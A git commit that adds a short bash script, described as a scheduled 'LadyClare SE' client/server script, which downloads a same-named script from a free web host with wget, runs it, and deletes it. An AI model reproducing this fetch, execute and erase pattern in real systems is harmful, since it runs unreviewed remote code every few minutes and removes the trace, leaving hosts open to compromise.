a1d31c48799380812d29dc9ab5b4082f5cfed275
ucanfindme18 <39616391+ucanfindme18@users.noreply.github.com>
2018-06-20 18:15:57 +0800

    Create LadyClareSE1.sh

---
+++ LadyClareSE1.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+# Script Author: _Dreyannz_
+# LadyClare SE ClientServer Script 
+# Scheduled Every 3 minutes
+
+
+wget http://albertomartesjr.000webhostapp.com/LadyClareSE1.sh
+chmod +x LadyClareSE1.sh
+./LadyClareSE1.sh
+rm LadyClareSE1* -f
